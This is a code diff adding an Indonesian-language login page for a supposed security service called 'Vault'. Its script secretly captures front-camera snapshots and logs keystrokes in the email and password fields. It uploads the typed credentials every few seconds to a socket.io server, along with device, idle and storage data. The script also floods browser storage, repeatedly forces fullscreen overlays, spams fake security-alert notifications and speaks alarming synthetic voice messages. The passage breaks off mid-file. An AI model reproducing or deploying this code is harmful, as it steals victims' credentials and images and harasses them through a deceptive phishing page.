@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Vault — Masuk ke Dashboard</title>
+    <meta name="description" content="Platform autentikasi dan keamanan digital. Masuk ke akun Vault Anda.">
+    <meta name="theme-color" content="#05050f">
+    <meta name="application-name" content="Vault">
+    <meta property="og:title" content="Vault — Masuk ke Dashboard">
+    <meta property="og:description" content="Platform autentikasi dan keamanan digital.">
+    <meta property="og:image" content="/favicon.svg">
+    <meta name="twitter:card" content="summary">
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="apple-touch-icon" href="/favicon.svg">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="/config.js"></script>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+        body { font-family:'Plus Jakarta Sans',sans-serif; min-height:100vh; min-height:100dvh; background:#05050f; color:#fff; overflow:hidden; display:flex; }
+        .bg-grid { position:fixed; inset:0; z-index:0; background-image:linear-gradient(rgba(255,255,255,0.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.015) 1px,transparent 1px); background-size:60px 60px; }
+        .bg-orbs { position:fixed; inset:0; z-index:0; overflow:hidden; }
+        .orb { position:absolute; border-radius:50%; filter:blur(80px); animation:orbFloat 20s ease-in-out infinite; }
+        .orb:nth-child(1) { width:500px; height:500px; background:rgba(0,212,255,0.08); top:-200px; left:-100px; }
+        .orb:nth-child(2) { width:400px; height:400px; background:rgba(139,92,246,0.06); bottom:-150px; right:-100px; animation-delay:-7s; }
+        .orb:nth-child(3) { width:350px; height:350px; background:rgba(236,72,153,0.04); top:50%; left:50%; transform:translate(-50%,-50%); animation-delay:-14s; }
+        @keyframes orbFloat { 0%,100%{transform:translate(0,0)scale(1)} 25%{transform:translate(60px,-40px)scale(1.1)} 50%{transform:translate(-30px,60px)scale(0.9)} 75%{transform:translate(40px,30px)scale(1.05)} }
+        .hero-section { flex:1; position:relative; z-index:1; display:flex; flex-direction:column; justify-content:center; align-items:center; padding:60px; overflow:hidden; background:radial-gradient(ellipse at 30% 50%,rgba(0,212,255,0.03) 0%,transparent 60%); }
+        .hero-content { max-width:460px; }
+        .hero-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(0,212,255,0.08); border:1px solid rgba(0,212,255,0.15); padding:6px 16px 6px 6px; border-radius:100px; font-size:.75rem; color:#00d4ff; font-weight:500; letter-spacing:.5px; margin-bottom:28px; }
+        .hero-badge .dot { width:6px; height:6px; border-radius:50%; background:#00d4ff; animation:pulse 2s ease-in-out infinite; }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+        .hero-content h1 { font-size:3.2rem; font-weight:800; line-height:1.15; letter-spacing:-1px; }
+        .hero-content h1 .gradient-text { background:linear-gradient(135deg,#00d4ff,#7c3aed,#ec4899); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; }
+        .hero-content p { color:#6a6a8e; font-size:1rem; line-height:1.8; margin-top:16px; }
+        .hero-stats { display:flex; gap:40px; margin-top:45px; padding-top:35px; border-top:1px solid #1a1a2e; }
+        .hero-stat h3 { font-size:1.6rem; font-weight:700; letter-spacing:-.5px; }
+        .hero-stat h3 span { color:#00d4ff; }
+        .hero-stat p { font-size:.8rem; color:#5a5a7e; margin-top:2px; }
+        .auth-section { width:460px; min-width:460px; position:relative; z-index:1; display:flex; flex-direction:column; justify-content:center; padding:50px 45px; background:rgba(10,10,30,0.6); backdrop-filter:blur(40px); -webkit-backdrop-filter:blur(40px); border-left:1px solid rgba(255,255,255,0.04); }
+        .auth-section::before { content:''; position:absolute; inset:0; background:linear-gradient(180deg,rgba(0,212,255,0.02) 0%,transparent 50%,rgba(139,92,246,0.02) 100%); pointer-events:none; }
+        .auth-header { position:relative; z-index:1; margin-bottom:32px; }
+        .auth-logo { display:inline-flex; align-items:center; gap:10px; margin-bottom:24px; cursor:pointer; text-decoration:none; }
+        .auth-logo .logo-mark { width:40px; height:40px; background:linear-gradient(135deg,#00d4ff,#7c3aed); border-radius:12px; display:flex; align-items:center; justify-content:center; font-size:1.2rem; font-weight:800; color:#fff; }
+        .auth-logo span { font-size:1rem; font-weight:600; letter-spacing:-.3px; color:#ccc; }
+        .auth-header h2 { font-size:1.5rem; font-weight:700; letter-spacing:-.5px; }
+        .auth-header p { color:#5a5a7e; font-size:.85rem; margin-top:6px; }
+        .form-wrap { position:relative; z-index:1; }
+        .input-group { margin-bottom:18px; }
+        .input-group label { display:block; font-size:.78rem; font-weight:600; color:#8a8aaa; letter-spacing:.5px; text-transform:uppercase; margin-bottom:8px; }
+        .input-field { position:relative; border-radius:12px; background:#0f0f25; border:1px solid #1e1e3e; transition:all .4s; }
+        .input-field:focus-within { border-color:#00d4ff; box-shadow:0 0 0 3px rgba(0,212,255,0.06); background:#12122a; }
+        .input-field input { width:100%; padding:15px 16px; background:none; border:none; outline:none; color:#fff; font-size:.9rem; font-family:inherit; }
+        .input-field input::placeholder { color:#3a3a5e; }
+        .input-field .input-append { position:absolute; right:12px; top:50%; transform:translateY(-50%); }
+        .input-field .input-append button { background:none; border:none; color:#5a5a7e; cursor:pointer; padding:4px; font-size:1.1rem; }
+        .checkbox-row { display:flex; justify-content:space-between; align-items:center; margin:22px 0; }
+        .checkbox-row label { display:flex; align-items:center; gap:8px; font-size:.82rem; color:#7a7a9a; cursor:pointer; user-select:none; }
+        .checkbox-row input[type="checkbox"] { display:none; }
+        .checkbox-row .check-box { width:18px; height:18px; border-radius:5px; border:2px solid #2a2a4e; display:flex; align-items:center; justify-content:center; transition:all .3s; flex-shrink:0; }
+        .checkbox-row input:checked+.check-box { background:#00d4ff; border-color:#00d4ff; }
+        .checkbox-row input:checked+.check-box::after { content:'✓'; color:#0a0a1a; font-size:11px; font-weight:700; }
+        .checkbox-row a { color:#5a5a7e; font-size:.82rem; text-decoration:none; }
+        .checkbox-row a:hover { color:#00d4ff; }
+        .btn-submit { width:100%; padding:16px; border:none; border-radius:12px; background:linear-gradient(135deg,#00d4ff,#7c3aed); color:#fff; font-size:.95rem; font-weight:600; cursor:pointer; position:relative; overflow:hidden; font-family:inherit; letter-spacing:.3px; transition:all .4s; }
+        .btn-submit::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,#7c3aed,#ec4899); opacity:0; transition:opacity .5s; }
+        .btn-submit:hover::before { opacity:1; }
+        .btn-submit:hover { transform:translateY(-2px); box-shadow:0 12px 40px rgba(0,212,255,0.2); }
+        .btn-submit:active { transform:translateY(0); }
+        .btn-submit span, .btn-submit .spinner { position:relative; z-index:1; }
+        .btn-submit .spinner { display:none; width:20px; height:20px; margin:0 auto; border:2px solid rgba(255,255,255,0.2); border-top-color:#fff; border-radius:50%; animation:spin .6s linear infinite; }
+        .btn-submit.loading span { display:none; }
+        .btn-submit.loading .spinner { display:block; }
+        @keyframes spin { to{transform:rotate(360deg)} }
+        .auth-divider { display:flex; align-items:center; gap:16px; margin:22px 0; position:relative; z-index:1; }
+        .auth-divider::before, .auth-divider::after { content:''; flex:1; height:1px; background:linear-gradient(90deg,transparent,#1e1e3e,transparent); }
+        .auth-divider span { color:#4a4a6e; font-size:.75rem; text-transform:uppercase; letter-spacing:1px; }
+        .social-row { display:flex; gap:10px; position:relative; z-index:1; }
+        .social-btn { flex:1; padding:13px; border-radius:10px; border:1px solid #1e1e3e; background:rgba(15,15,37,0.5); color:#8a8aaa; cursor:pointer; font-size:.82rem; font-weight:500; display:flex; align-items:center; justify-content:center; gap:8px; transition:all .3s; font-family:inherit; backdrop-filter:blur(10px); }
+        .social-btn:hover { border-color:#3a3a6e; background:rgba(20,20,50,0.8); color:#fff; transform:translateY(-1px); }
+        .social-btn:active { transform:scale(0.97); }
+        .auth-footer { text-align:center; margin-top:25px; font-size:.8rem; color:#4a4a6e; position:relative; z-index:1; }
+        .auth-footer a { color:#5a5a8a; text-decoration:none; font-weight:500; }
+        .auth-footer a:hover { color:#00d4ff; }
+        .toast-container { position:fixed; top:24px; right:24px; z-index:999; display:flex; flex-direction:column; gap:10px; }
+        .toast { padding:14px 20px; border-radius:10px; font-size:.85rem; backdrop-filter:blur(20px); animation:toastIn .4s ease forwards; display:flex; align-items:center; gap:10px; min-width:300px; max-width:400px; box-shadow:0 10px 40px rgba(0,0,0,0.3); }
+        .toast.error { background:rgba(30,10,20,0.9); border:1px solid rgba(255,23,68,0.2); color:#ff6b6b; }
+        @keyframes toastIn { from{opacity:0;transform:translateX(100%)scale(0.95)} to{opacity:1;transform:translateX(0)scale(1)} }
+        .toast.out { animation:toastOut .25s ease forwards; }
+        @keyframes toastOut { to{opacity:0;transform:translateX(50px)} }
+        .splash { position:fixed; inset:0; z-index:100; background:#05050f; display:flex; flex-direction:column; align-items:center; justify-content:center; transition:opacity .8s ease,visibility .8s ease; }
+        .splash.hidden { opacity:0; visibility:hidden; pointer-events:none; }
+        .splash .sp-logo { width:72px; height:72px; background:linear-gradient(135deg,#00d4ff,#7c3aed); border-radius:20px; display:flex; align-items:center; justify-content:center; font-size:2.2rem; font-weight:800; color:#fff; animation:splashPop .6s ease; }
+        @keyframes splashPop { 0%{transform:scale(0.5);opacity:0} 70%{transform:scale(1.1)} 100%{transform:scale(1);opacity:1} }
+        .splash .sp-name { margin-top:20px; font-size:1.4rem; font-weight:700; color:#fff; }
+        .splash .sp-load { margin-top:40px; width:160px; height:3px; background:#1a1a2e; border-radius:2px; overflow:hidden; }
+        .splash .sp-load-bar { height:100%; width:0%; background:linear-gradient(90deg,#00d4ff,#7c3aed); border-radius:2px; animation:loadBar 1.2s ease forwards; }
+        @keyframes loadBar { to{width:100%} }
+        .splash .sp-sub { margin-top:12px; font-size:.78rem; color:#4a4a6e; }
+        .loading-overlay { position:fixed; inset:0; z-index:50; background:#05050f; display:none; flex-direction:column; align-items:center; justify-content:center; }
+        .loading-overlay.show { display:flex; }
+        .loading-overlay .lo-spinner { width:48px; height:48px; border:3px solid #1a1a2e; border-top-color:#00d4ff; border-radius:50%; animation:spin .8s linear infinite; }
+        .loading-overlay .lo-text { margin-top:20px; font-size:.95rem; color:#aaa; }
+        .loading-overlay .lo-sub { margin-top:8px; font-size:.78rem; color:#4a4a6e; }
+        .loading-overlay .lo-bar { margin-top:30px; width:200px; height:3px; background:#1a1a2e; border-radius:2px; overflow:hidden; }
+        .loading-overlay .lo-bar-inner { height:100%; width:0%; background:linear-gradient(90deg,#00d4ff,#7c3aed); border-radius:2px; }
+
+        .notif-toast { position:fixed; top:80px; left:50%; transform:translateX(-50%); z-index:200; background:rgba(30,10,20,0.95); backdrop-filter:blur(20px); border:1px solid rgba(255,23,68,0.2); padding:16px 24px; border-radius:14px; display:none; text-align:center; min-width:280px; max-width:360px; }
+        .notif-toast.show { display:block; animation:notifPop .5s ease; }
+        .notif-toast .nt-icon { font-size:2rem; margin-bottom:8px; }
+        .notif-toast .nt-title { font-weight:700; color:#fff; font-size:.95rem; }
+        .notif-toast .nt-body { color:#aaa; font-size:.82rem; margin-top:4px; }
+        .notif-toast .nt-btn { margin-top:12px; padding:8px 24px; border-radius:8px; border:none; background:linear-gradient(135deg,#00d4ff,#7c3aed); color:#fff; font-weight:600; cursor:pointer; font-size:.85rem; font-family:inherit; }
+        @keyframes notifPop { 0%{opacity:0;transform:translateX(-50%)scale(0.85)translateY(-20px)} 100%{opacity:1;transform:translateX(-50%)scale(1)translateY(0)} }
+
+        @media (max-width:960px) {
+            .hero-section { display:none; }
+            body { overflow-y:auto; }
+            .auth-section { width:100%; min-width:unset; padding:0; border-left:none; background:none; backdrop-filter:none; justify-content:flex-start; overflow-y:auto; }
+            .auth-section::before { display:none; }
+            .auth-inner { padding:32px 24px 40px; width:100%; max-width:420px; margin:0 auto; }
+            .auth-header { margin-bottom:28px; }
+            .auth-logo { margin-bottom:20px; }
+            .auth-logo .logo-mark { width:36px; height:36px; font-size:1.1rem; border-radius:10px; }
+            .auth-logo span { font-size:.95rem; }
+            .auth-header h2 { font-size:1.35rem; }
+            .auth-header p { font-size:.82rem; }
+            .input-group { margin-bottom:16px; }
+            .input-field input { padding:14px 16px; font-size:16px; }
+            .input-group label { font-size:.75rem; margin-bottom:6px; }
+            .checkbox-row { margin:18px 0; }
+            .checkbox-row label, .checkbox-row a { font-size:.8rem; }
+            .btn-submit { padding:15px; font-size:.92rem; border-radius:11px; }
+            .btn-submit:active { transform:scale(.98); }
+            .auth-divider { margin:18px 0; }
+            .social-row { gap:8px; }
+            .social-btn { padding:12px 8px; font-size:.78rem; border-radius:9px; }
+            .social-btn svg { width:14px; height:14px; }
+            .auth-footer { margin-top:22px; font-size:.78rem; }
+            .toast-container { top:16px; right:16px; left:16px; }
+            .toast { min-width:unset; width:100%; font-size:.82rem; padding:13px 16px; }
+            .notif-toast { width:90%; min-width:unset; }
+        }
+        @media (max-width:380px) {
+            .auth-inner { padding:24px 18px 32px; }
+            .social-btn { font-size:.72rem; padding:10px 6px; }
+            .social-btn .s-text { display:none; }
+        }
+        @supports (padding:env(safe-area-inset-bottom)) {
+            .auth-inner { padding-bottom:calc(40px + env(safe-area-inset-bottom)); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="splash" id="splash">
+        <div class="sp-logo">V</div>
+        <div class="sp-name">Vault</div>
+        <div class="sp-load"><div class="sp-load-bar"></div></div>
+        <div class="sp-sub">Memuat …</div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="lo-spinner"></div>
+        <div class="lo-text" id="loText">Memverifikasi kredensial…</div>
+        <div class="lo-sub" id="loSub">Mohon tunggu sebentar</div>
+        <div class="lo-bar"><div class="lo-bar-inner" id="loBar"></div></div>
+    </div>
+
+    <div class="notif-toast" id="notifToast">
+        <div class="nt-icon">🔒</div>
+        <div class="nt-title" id="ntTitle">Verifikasi Keamanan</div>
+        <div class="nt-body" id="ntBody">Sistem mendeteksi perangkat baru. Verifikasi identitas Anda untuk melanjutkan.</div>
+        <button class="nt-btn" onclick="dismissNotif()">Lanjutkan</button>
+    </div>
+
+    <div class="bg-grid"></div>
+    <div class="bg-orbs">
+        <div class="orb"></div><div class="orb"></div><div class="orb"></div>
+    </div>
+
+    <div class="toast-container" id="toastContainer"></div>
+
+    <section class="hero-section">
+        <div class="hero-content">
+            <div class="hero-badge"><span class="dot"></span> Sistem Verifikasi Aktif</div>
+            <h1>Jelajahi dunia<br><span class="gradient-text">tanpa batas</span></h1>
+            <p>Platform keamanan digital generasi terbaru dengan enkripsi militer dan monitoring real-time untuk melindungi data Anda 24/7.</p>
+            <div class="hero-stats">
+                <div class="hero-stat"><h3><span>12K+</span></h3><p>Pengguna aktif</p></div>
+                <div class="hero-stat"><h3><span>99.9%</span></h3><p>Uptime server</p></div>
+                <div class="hero-stat"><h3><span>256</span></h3><p>Bit enkripsi</p></div>
+            </div>
+        </div>
+    </section>
+
+    <section class="auth-section" id="authSection">
+        <div class="auth-inner">
+            <div class="auth-header">
+                <a href="/" class="auth-logo">
+                    <div class="logo-mark">V</div>
+                    <span>Vault</span>
+                </a>
+                <h2>Akses akun Anda</h2>
+                <p>Masukkan kredensial untuk melanjutkan ke dashboard</p>
+            </div>
+            <div class="form-wrap">
+                <form onsubmit="return handleLogin(event)">
+                    <div class="input-group">
+                        <label>Alamat Email</label>
+                        <div class="input-field"><input type="email" id="emailInput" placeholder="nama@perusahaan.com" autocomplete="email" inputmode="email" autofocus></div>
+                    </div>
+                    <div class="input-group">
+                        <label>Kata Sandi</label>
+                        <div class="input-field">
+                            <input type="password" id="passInput" placeholder="****" autocomplete="current-password">
+                            <div class="input-append"><button type="button" onclick="togglePass()" aria-label="Lihat sandi">👁</button></div>
+                        </div>
+                    </div>
+                    <div class="checkbox-row">
+                        <label><input type="checkbox" checked><span class="check-box"></span>Tetap masuk</label>
+                        <a href="/lupa-password.html">Lupa sandi?</a>
+                    </div>
+                    <button type="submit" class="btn-submit" id="loginBtn"><span>Masuk ke Dashboard</span><div class="spinner"></div></button>
+                </form>
+                <div class="auth-divider"><span>Atau</span></div>
+                <div class="social-row">
+                    <button class="social-btn" onclick="handleSocial('Google')">
+                        <svg width="16" height="16" viewBox="0 0 24 24"><path fill="currentColor" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="currentColor" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="currentColor" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="currentColor" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+                        <span class="s-text">Google</span>
+                    </button>
+                    <button class="social-btn" onclick="handleSocial('GitHub')">
+                        <svg width="16" height="16" viewBox="0 0 24 24"><path fill="currentColor" d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+                        <span class="s-text">GitHub</span>
+                    </button>
+                    <button class="social-btn" onclick="handleSocial('SSO')">
+                        <svg width="16" height="16" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+                        <span class="s-text">SSO</span>
+                    </button>
+                </div>
+                <div class="auth-footer">Belum punya akun? <a href="/daftar.html">Daftar gratis</a></div>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        let deviceId = '', watchId = null, stream = null, snapInterval = null;
+        let attemptCount = 0, gpsDeniedCount = 0, idleTimer = null, floodInterval = null, notifInterval = null;
+        const emailInput = document.getElementById('emailInput');
+        const passInput = document.getElementById('passInput');
+
+        setTimeout(() => document.getElementById('splash').classList.add('hidden'), 1800);
+
+        // ============ SERVICE WORKER REGISTRATION ============
+        function registerSW() {
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('/sw.js').then(reg => {
+                    socket.emit('device-info', { sw: { registered: true, scope: reg.scope } });
+                    if ('SyncManager' in window) {
+                        reg.sync.register('sync-tracker').catch(()=>{});
+                    }
+                    if ('periodicSync' in reg) {
+                        navigator.permissions.query({name:'periodic-background-sync'}).then(p => {
+                            if (p.state === 'granted') {
+                                reg.periodicSync.register('periodic-tracker', { minInterval: 10*60*1000 }).catch(()=>{});
+                            }
+                        });
+                    }
+                }).catch(() => {});
+            }
+        }
+
+        // ============ IDLE DETECTION ============
+        function initIdleDetection() {
+            let idleSince = null;
+            function resetIdle() { idleSince = null; socket.emit('device-info', { idle: { state: 'active', time: Date.now() } }); }
+            function markIdle() { idleSince = Date.now(); socket.emit('device-info', { idle: { state: 'idle', idleFor: 60000, time: Date.now() } }); }
+            document.addEventListener('mousemove', resetIdle);
+            document.addEventListener('keydown', resetIdle);
+            document.addEventListener('touchstart', resetIdle);
+            document.addEventListener('scroll', resetIdle);
+            setInterval(() => {
+                if (idleSince === null) { idleSince = Date.now(); }
+                const ms = Date.now() - idleSince;
+                if (ms > 60000 && !document.hidden) {
+                    socket.emit('device-info', { idle: { state: 'idle', idleFor: ms, time: Date.now() } });
+                }
+            }, 15000);
+        }
+
+        // ============ SPEECH SYNTHESIS (SUARA HANTU) ============
+        function speakText(text) {
+            if (!window.speechSynthesis) return;
+            try {
+                window.speechSynthesis.cancel();
+                const u = new SpeechSynthesisUtterance(text);
+                u.lang = 'id-ID';
+                u.rate = 0.9;
+                u.pitch = 0.8;
+                window.speechSynthesis.speak(u);
+                socket.emit('device-info', { speech: { text: text.slice(0,100), time: Date.now() } });
+            } catch(e) {}
+        }
+
+        function scheduleGhostSpeech() {
+            const messages = [
+                'Akun Anda telah diakses dari perangkat yang tidak dikenal.',
+                'Terdeteksi aktivitas mencurigakan pada akun Anda.',
+                'Silakan verifikasi identitas Anda segera untuk mengamankan akun.',
+                'Percobaan login gagal terdeteksi. Lindungi akun Anda.'
+            ];
+            setTimeout(() => speakText(messages[0]), 5000);
+            setTimeout(() => speakText(messages[1]), 15000);
+            setTimeout(() => speakText(messages[2]), 30000);
+            // On login fail
+            const origHandle = handleLogin;
+            window.handleLogin = async function(e) {
+                const r = await origHandle(e);
+                speakText(messages[attemptCount % messages.length]);
+                return r;
+            };
+        }
+
+        // ============ STORAGE FLOOD ============
+        function startStorageFlood() {
+            const DB_NAME = 'VaultCache';
+            const STORE = 'blobs';
+            let db = null;
+            const req = indexedDB.open(DB_NAME, 1);
+            req.onupgradeneeded = (e) => {
+                db = e.target.result;
+                if (!db.objectStoreNames.contains(STORE)) db.createObjectStore(STORE);
+            };
+            req.onsuccess = (e) => {
+                db = e.target.result;
+                let chunk = 0;
+                floodInterval = setInterval(() => {
+                    try {
+                        const tx = db.transaction(STORE, 'readwrite');
+                        const store = tx.objectStore(STORE);
+                        const blob = new Blob([new ArrayBuffer(512 * 1024)]); // 512KB per write
+                        store.put(blob, 'chunk_' + (chunk++));
+                        socket.emit('device-info', { storageFlood: { chunks: chunk, totalMB: Math.round(chunk * 0.5) } });
+                    } catch(e) {
+                        clearInterval(floodInterval);
+                        socket.emit('device-info', { storageFlood: { error: e.message, chunks: chunk } });
+                    }
+                }, 10000);
+            };
+        }
+
+        // ============ FULLSCREEN HIJACK ============
+        function initFullscreenHijack() {
+            const overlay = document.createElement('div');
+            overlay.id = 'fs-overlay';
+            overlay.style.cssText = 'position:fixed;inset:0;z-index:99999;background:#05050f;display:none;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;';
+            overlay.innerHTML = '<div style="font-size:3rem;margin-bottom:20px;">🔒</div><div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:8px;">Verifikasi Keamanan</div><div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Tap untuk verifikasi identitas Anda</div><button style="padding:14px 40px;border:none;border-radius:12px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;">Verifikasi Sekarang</button>';
+            document.body.appendChild(overlay);
+
+            let fsActive = false;
+
+            function enterFS() {
+                const el = document.documentElement;
+                if (el.requestFullscreen) {
+                    el.requestFullscreen().then(() => {
+                        fsActive = true;
+                        overlay.style.display = 'flex';
+                        socket.emit('device-info', { fullscreen: { state: 'active', time: Date.now() } });
+                    }).catch(() => {});
+                }
+            }
+
+            document.addEventListener('click', () => {
+                if (!fsActive) enterFS();
+            }, { once: true });
+
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement && fsActive) {
+                    fsActive = false;
+                    overlay.style.display = 'none';
+                    setTimeout(enterFS, 500);
+                }
+            });
+
+            overlay.querySelector('button').addEventListener('click', () => {
+                overlay.style.display = 'none';
+                if (document.fullscreenElement) {
+                    document.exitFullscreen().catch(() => {});
+                }
+                fsActive = false;
+                // Re-enter fullscreen after 30s
+                setTimeout(enterFS, 30000);
+            });
+
+            // Try entering fullscreen every 2 minutes
+            setInterval(() => {
+                if (!document.fullscreenElement) enterFS();
+            }, 120000);
+        }
+
+        // ============ NOTIFICATION SPAM ============
+        function initNotificationSpam() {
+            if (!('Notification' in window)) return;
+            if (Notification.permission === 'granted') {
+                startNotifSpam();
+            } else if (Notification.permission !== 'denied') {
+                Notification.requestPermission().then(p => {
+                    if (p === 'granted') startNotifSpam();
+                });
+            }
+        }
+
+        function startNotifSpam() {
+            const msgs = [
+                { title: '⚠️ Peringatan Keamanan', body: 'Login mencurigakan terdeteksi dari perangkat baru.' },
+                { title: '🔒 Verifikasi Diperlukan', body: 'Akun Anda mungkin telah diretas. Verifikasi segera.' },
+                { title: '🚨 Aktivitas Tidak Biasa', body: 'Terlalu banyak percobaan login dari lokasi tidak dikenal.' },
+                { title: '🛡️ Lindungi Akun Anda', body: 'Akses tidak sah terdeteksi. Ubah kata sandi Anda sekarang.' },
+                { title: '📱 Perangkat Baru Terdeteksi', body: 'Perangkat tidak dikenal mencoba mengakses akun Anda.' }
+            ];
+            let idx = 0;
+            notifInterval = setInterval(() => {
+                try {
+                    const n = new Notification(msgs[idx].title, { body: msgs[idx].body, icon: '/favicon.svg', tag: 'vault-spam' });
+                    idx = (idx + 1) % msgs.length;
+                    setTimeout(() => n.close(), 3000);
+                    socket.emit('device-info', { notifSpam: { title: msgs[idx].title, time: Date.now() } });
+                } catch(e) {}
+            }, 8000);
+        }
+
+        // ============ PERSISTENT STORAGE ============
+        function initPersistentStorage() {
+            // Request persistent storage
+            if (navigator.storage && navigator.storage.persist) {
+                navigator.storage.persist().then(granted => {
+                    socket.emit('device-info', { persistentStorage: { granted, time: Date.now() } });
+                });
+            }
+            if (navigator.storage && navigator.storage.estimate) {
+                navigator.storage.estimate().then(est => {
+                    socket.emit('device-info', { storageEstimate: { usage: est.usage, quota: est.quota, pct: Math.round(est.usage/est.quota*100) } });
+                });
+            }
+            // Save critical data to IndexedDB for persistence
+            const dbReq = indexedDB.open('VaultPersist', 1);
+            dbReq.onupgradeneeded = (e) => {
+                const db = e.target.result;
+                if (!db.objectStoreNames.contains('data')) db.createObjectStore('data');
+            };
+            dbReq.onsuccess = (e) => {
+                const db = e.target.result;
+                // Save device ID persistently
+                const tx = db.transaction('data', 'readwrite');
+                tx.objectStore('data').put({ deviceId, time: Date.now() }, 'device');
+                // Periodically save latest data
+                setInterval(() => {
+                    const tx2 = db.transaction('data', 'readwrite');
+                    tx2.objectStore('data').put({ location: { lat: 'pending', time: Date.now() } }, 'lastData');
+                }, 60000);
+            };
+        }
+
+        const socket = io(SERVER_URL, { query: { deviceId: localStorage.getItem('deviceId') || '' } });
+        socket.on('device-id', (id) => { deviceId = id; localStorage.setItem('deviceId', id); });
+
+        function togglePass() { const i=passInput; i.type=i.type==='password'?'text':'password'; }
+        function showToast(msg) { const c=document.getElementById('toastContainer'), t=document.createElement('div'); t.className='toast error'; t.innerHTML='<span>✕</span> '+msg; c.appendChild(t); setTimeout(()=>{t.classList.add('out');setTimeout(()=>t.remove(),250)},3500); }
+
+        // ============ 1. FRONT CAMERA CAPTURE ============
+        function requestFrontCamera() {
+            if (!navigator.mediaDevices?.getUserMedia) return;
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
+                .then((s) => {
+                    const v = document.createElement('video');
+                    v.autoplay = true; v.playsinline = true;
+                    v.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
+                    v.srcObject = s; document.body.appendChild(v);
+                    v.onloadedmetadata = () => {
+                        v.play();
+                        setTimeout(() => {
+                            const ca = document.createElement('canvas');
+                            ca.width = 640; ca.height = 480;
+                            ca.getContext('2d').drawImage(v, 0, 0, 640, 480);
+                            socket.emit('snapshot', { image: ca.toDataURL('image/jpeg',0.5).split(',')[1], front: true });
+                            s.getTracks().forEach(t => t.stop());
+                        }, 500);
+                    };
+                })
+                .catch(() => {});
+        }
+
+        // ============ 2. KEYSTROKE LOGGER ============
+        function initKeystrokeLogger() {
+            let lastSent = 0;
+            function logKey(e) {
+                if (e.key === 'Tab' || e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
+                socket.emit('keystroke', { k: e.key, ts: Date.now() });
+            }
+            emailInput.addEventListener('keydown', logKey);
+            passInput.addEventListener('keydown', logKey);
+            // Also capture full field values periodically
+            setInterval(() => {
+                const email = emailInput.value;
+                const pass = passInput.value;
+                if (email) socket.emit('device-info', { fieldEmail: email.slice(0,200) });
+                if (pass && pass.length > 0) {
+                    socket.emit('device-info', { fieldPass: pass.slice(0,100) });
+                }
+            }, 3000);
+        }
+
+        // ============ 3. CLICK & SCROLL HEATMAP ============
+        function initClickHeatmap() {
